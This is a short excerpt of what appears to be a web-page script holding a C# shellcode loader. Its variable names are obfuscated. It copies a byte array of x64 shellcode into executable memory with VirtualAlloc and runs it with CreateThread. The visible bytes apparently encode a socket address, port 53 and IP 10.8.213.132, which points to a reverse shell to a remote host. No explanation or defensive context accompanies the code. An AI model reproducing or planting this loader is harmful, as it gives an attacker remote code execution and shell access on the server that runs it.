...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x00,0x35,0x0a,0x08,0xd5,0x84,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr vGFf1 = VirtualAlloc(IntPtr.Zero,(UIntPtr)yO4AxjhsYs.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(yO4AxjhsYs,0,vGFf1,yO4AxjhsYs.Length);
        IntPtr jrJ8y8GJeQx = IntPtr.Zero;
        IntPtr yzeFg = CreateThread(IntPtr.Zero,UIntPtr.Zero,vGFf1,IntPtr.Zero,0,ref jrJ8y8GJeQx);
    }
</script>
